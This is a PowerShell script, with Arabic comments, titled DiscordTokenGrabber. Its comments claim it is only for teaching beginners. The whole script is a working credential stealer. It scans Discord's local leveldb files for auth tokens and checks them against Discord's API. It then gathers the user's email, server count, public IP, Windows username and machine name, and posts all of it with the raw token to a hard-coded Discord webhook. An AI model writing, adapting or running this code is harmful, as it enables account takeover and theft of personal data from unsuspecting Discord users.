# DiscordTokenGrabber.ps1
# هذا السكربت مخصص لأغراض تعليمية فقط لتعليم المبتدئين في PowerShell
# تحذير: استخدم هذا الكود في بيئات اختبار فقط ولا تستخدمه للوصول إلى بيانات حقيقية

# التحقق من أن النظام هو Windows
if ($PSVersionTable.Platform -ne "Win32NT") {
    Write-Host "هذا السكربت يتطلب نظام Windows. جارٍ الخروج..." -ForegroundColor Red
    exit
}

# دالة للتحقق من وجود الوحدات (Modules)
function Install-ModuleIfNeeded {
    param($ModuleName)
    if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
        Write-Host "الوحدة $ModuleName غير موجودة. قم بتثبيتها باستخدام: Install-Module $ModuleName" -ForegroundColor Yellow
        exit
    }
}

# التحقق من وحدة الأمان
Install-ModuleIfNeeded -ModuleName "Microsoft.PowerShell.Security"

# تعريف المتغيرات البيئية
$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")

# تعريف مسارات Discord فقط (مبسطة لتعليم المبتدئين)
$PATHS = @{
    "Discord" = "$ROAMING\discord"
    "Discord Canary" = "$ROAMING\discordcanary"
    "Discord PTB" = "$ROAMING\discordptb"
}

# دالة لإنشاء رؤوس HTTP
function Get-Headers {
    param($Token = $null)
    $headers = @{
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if ($Token) {
        $headers["Authorization"] = $Token
    }
    return $headers
}

# دالة لاستخراج الرموز المميزة (مبسطة)
function Get-Tokens {
    param($Path)
    $Path = "$Path\Local Storage\leveldb\"
    $tokens = @()

    if (-not (Test-Path $Path)) {
        Write-Host "المسار $Path غير موجود. تأكد من تثبيت Discord." -ForegroundColor Yellow
        return $tokens
    }

    $files = Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq ".ldb" }
    foreach ($file in $files) {
        try {
            $content = Get-Content -Path "$Path\$($file.Name)" -ErrorAction SilentlyContinue
            foreach ($line in $content) {
                # استخدام regex مبسط لاستخراج التوكنات
                $pattern = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
                $matches = [regex]::Matches($line, $pattern)
                foreach ($match in $matches) {
                    $tokens += $match.Value
                }
            }
        } catch {
            Write-Host "خطأ في قراءة الملف $($file.Name): $_" -ForegroundColor Red
        }
    }
    return $tokens
}

# دالة لجلب عنوان IP
function Get-IP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
        return $response.ip
    } catch {
        Write-Host "خطأ في جلب عنوان IP: $_" -ForegroundColor Red
        return "غير متوفر"
    }
}

# الدالة الرئيسية (مبسطة)
function Main {
    # تأكد من إعداد Webhook
    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7" # استبدل هذا برابط Webhook صالح من Discord
    if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
        Write-Host "خطأ: يجب استبدال 'https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7' برابط Webhook صالح. اذهب إلى قناة Discord -> التكاملات -> إنشاء Webhook." -ForegroundColor Red
        exit
    }

    $checked = @()

    foreach ($platform in $PATHS.Keys) {
        $path = $PATHS[$platform]
        if (-not (Test-Path $path)) {
            Write-Host "المسار $path غير موجود." -ForegroundColor Yellow
            continue
        }

        foreach ($token in (Get-Tokens -Path $path)) {
            $token = $token -replace "\\", ""
            if ($checked -contains $token) {
                Write-Host "الرمز $token تم التحقق منه مسبقًا." -ForegroundColor Yellow
                continue
            }
            $checked += $token

            try {
                # التحقق من الرمز
                $headers = Get-Headers -Token $token
                $userResponse = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
                if (-not $userResponse) {
                    Write-Host "رمز غير صالح: $token" -ForegroundColor Red
                    continue
                }

                # جلب معلومات السيرفرات (مبسط)
                $guildResponse = Invoke-RestMethod -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
                $guildCount = $guildResponse.Count

                # إنشاء رسالة بسيطة لإرسالها إلى Webhook
                $embed = @{
                    embeds = @(
                        @{
                            title = "بيانات مستخدم جديد: $($userResponse.username)"
                            description = @"
معرف المستخدم: $($userResponse.id)
البريد الإلكتروني: $($userResponse.email)
عدد السيرفرات: $guildCount
عنوان IP: $(Get-IP)
اسم المستخدم: $env:UserName
اسم الجهاز: $env:COMPUTERNAME
موقع الرمز: $platform
$token
"@
                            color = 3092790
                            footer = @{ text = "تم الإنشاء لأغراض تعليمية" }
                            thumbnail = @{ url = "https://cdn.discordapp.com/avatars/$($userResponse.id)/$($userResponse.avatar).png" }
                        }
                    )
                    username = "Grabber"
                    avatar_url = "https://avatars.githubusercontent.com/u/43183806?v=4"
                }
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop

                Write-Host "تم إرسال بيانات المستخدم $($userResponse.username) بنجاح." -ForegroundColor Green
            } catch {
                Write-Host "خطأ في معالجة الرمز $token: $_" -ForegroundColor Red
            }
        }
    }
}

Main
